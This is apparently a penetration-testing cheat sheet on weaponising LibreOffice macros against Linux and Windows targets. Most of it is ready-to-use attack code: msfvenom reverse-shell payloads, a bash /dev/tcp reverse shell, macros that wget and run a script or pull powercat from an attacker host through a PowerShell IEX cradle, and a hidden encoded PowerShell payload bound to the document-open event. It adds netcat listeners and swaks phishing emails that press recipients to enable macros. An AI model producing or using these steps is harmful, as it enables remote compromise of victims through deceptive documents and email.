# LibreOffice Macros

## Automated

### 1) Download the tool from GitHub

    git clone https://github.com/0bfxgh0st/MMG-LO

### 2) Generate payload based on the attack

LibreOffice Calc

    python3 mmg-ods.py windows ATTACK_IP PORT

### 3) Send email to victim

    sendemail -f 'sender@localhost' -t 'recipient@localhost' -s TARGET_IP:25 -u 'Your Spreadsheet' -m 'Here is your Spreadsheet' -a file.ods

OR

    swaks -t recipient@localhost --from sender@localhost --attach @file.ods --server TARGET_IP --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"

## Linux Targets

### 1) Generate a Linux-compatible reverse shell

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f bash -o payload.sh
    msfvenom -p python/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o payload.py
    echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh

### 2) Create a Malicious LibreOffice Macro


#### 1. Open LibreOffice Writer and press ALT + F11 to open the macro editor.

#### 2. Create a new macro under My Macros > Standard > Module1.

        Sub RunShell
            Shell("/bin/bash -c 'wget http://<your_ip>/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh'")
        End Sub

### 3) Host the Payload on a Web Server

        python3 -m http.server 80

### 4) Save the LibreOffice Document with Macro

Save the document as update.odt with the embedded macro. LibreOffice macros are not executed automatically—social engineering is needed to trick the target into enabling macros. 

### 5) Setup listener

        nc -lvnp 4444

### 6) Deliver

        swaks --to target@example.com --from emmanuel@example.com \ --server smtp.example.com:587 --auth LOGIN \ --auth-user emmanuel@example.com --auth-password 'your_password' \ --attach update.odt --header "Subject: Important Update" \ --body "Hello,\n\nPlease find the attached document and enable macros to view the content.\n\nBest regards,\nEmmanuel"

## Windows Targets

### 1) Generate the Reverse Shell Payload with MSFvenom

    msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta

### 2) Extract and encode the payload

Open the generated HTA file (evil.hta) and copy the payload (it is the Base64 encoded string). Use the following Python script to divide the payload into 50-character chunks (easier to embed within a macro).

    # Python script to split the payload into 50-character chunks
    s = "<PASTE_PAYLOAD_HERE>"  # Replace with your payload string
    n = 50  # Chunk size
    
    for i in range(0, len(s), n):
        chunk = s[i:i + n]
        print('Str = Str + "' + chunk + '"') 

### 3) Create the LibreOffice Spreadsheet with Macro Code:


#### 1. Open LibreOffice Calc and create a new spreadsheet (save it as exploit.ods).
    
#### 2. Enable Macros:
        
- Go to Tools → Options → LibreOffice → Security → Macro Security.
 - Set security to Medium or Low to allow macros to run.

#### 3. Insert the Macro Code:
        
- Go to Tools → Macros → Organize Macros → LibreOffice Basic.
- Click New, give it a name (e.g., Exploit), and paste the macro code below.
- After that, go to Tools -> Customize, then select Events tab and assign our malicious macro to the "Open Document" event

### 4) Macro code example

    REM ***** BASIC *****
    Sub Exploit
        Dim Str As String
        ' Add payload chunks here
        Str = Str + "powershell.exe -nop -w hidden -e "
        Str = Str + "<INSERT_YOUR_PAYLOAD_CHUNKS>"
        
        ' Execute the payload using Shell
        Shell Str, 1
    End Sub

### Simpler macro code example

    Sub Main
    Shell("cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACK_IP/powercat.ps1');powercat -c ATTACK_IP -p PORT -e powershell")
    End Sub

Replace <INSERT_YOUR_PAYLOAD_CHUNKS> with the output from the Python script.

Explanation: The macro creates a PowerShell command to run the payload (-nop for non-interactive, -w hidden for stealth) and executes it using the Shell function.

Shell Command: choosing between Shell Str, 1 and Shell(Str) often depends on the specific requirements of the script and how the executed command should behave. In the case of exploiting LibreOffice macros, using Shell Str, 1 provides greater control and is a more reliable approach for executing payloads in a way that is likely to succeed in various environments. The Shell function can also be used with just one argument, but this would imply that it runs the command without any specific window display options; this means it might not control how the command window behaves (e.g., hidden or minimized), which might not be desirable for a payload execution context.

### 5) Setup listener

    nc -lvnp 4444

### 6) Deliver

    swaks --to target@example.com --from emmanuel@example.com \ --server smtp.example.com:587 --auth LOGIN \ --auth-user emmanuel@example.com --auth-password 'your_password' \ --attach evil.hta --header "Subject: Important Document" \ --body "Hi,\n\nPlease find the attached document.\n\nBest regards,\nEmmanuel"
